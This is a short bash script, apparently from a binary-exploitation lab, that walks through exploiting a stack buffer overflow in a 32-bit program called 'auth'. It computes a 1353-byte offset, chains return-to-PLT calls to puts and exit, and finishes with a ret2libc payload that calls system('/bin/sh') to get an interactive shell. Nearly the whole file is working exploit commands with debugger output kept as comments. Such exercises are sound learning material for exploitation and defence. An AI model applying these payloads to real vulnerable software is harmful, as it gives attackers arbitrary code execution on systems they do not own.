#!/usr/bin/env bash

# ========== 1 ==========
readelf -s auth | grep "GLIBC"

# ========== 2 ==========
# 0x8048627 <check_password+59>:       lea    eax,[ebp-0x545] <- offset = 0x545 + 4 = 1353
# 0x804862d <check_password+65>:       mov    DWORD PTR [esp],eax
# 0x8048630 <check_password+68>:       call   0x80485cd <read_password>
#
# gdb-peda$ info address puts@plt
# Symbol "puts@plt" is at 0x80484b0 in a file compiled without debugging.
python -c 'print("A" * 1353 + "\xb0\x84\x04\x08")' | ltrace ../src/auth


# ========== 3 ==========
# gdb-peda$ searchmem "malloc failed"
# Searching for 'malloc failed' in: None ranges
# Found 3 results, display max 3 items:
#             auth : 0x8048776 ("malloc failed")

# ========== 4 ==========
# auth : 0x8048776 ("malloc failed") -> "failed" = 0x8048776 + 7 = 0x804877d
python -c 'print("A" * 1353 + "\xb0\x84\x04\x08" + "JUNK" + "\x7d\x87\x04\x08")' | ../src/auth

# ========== 5 ==========
# gdb-peda$ info address exit@plt
# Symbol "exit@plt" is at 0x80484c0 in a file compiled without debugging.
python -c 'print("A" * 1353 + "\xb0\x84\x04\x08" + "\xc0\x84\x04\x08" + "\x7d\x87\x04\x08")' | ../src/auth

# ========== 6 ==========
# $ nm -D  /lib/i386-linux-gnu/libc.so.6 | grep system
# 0003d200 T __libc_system
# 00129640 T svcerr_systemerr
# 0003d200 W system
# $ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 17e0cf /bin/sh

# ========== 7 ==========
# $ LD_TRACE_LOADED_OBJECTS=1 ./auth
#       ...
#       libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7bcc000)
#       ...
# system = 0xf7bcc000 + 0x0003d200 = 0xf7c09200
# binsh  = 0xf7bcc000 + 0x17e0cf = 0xf7d4a0cf
cat <(python -c 'print("A" * 1353 + "\x00\x92\xc0\xf7" + "JUNK" + "\xcf\xa0\xd4\xf7")') - | ../src/auth
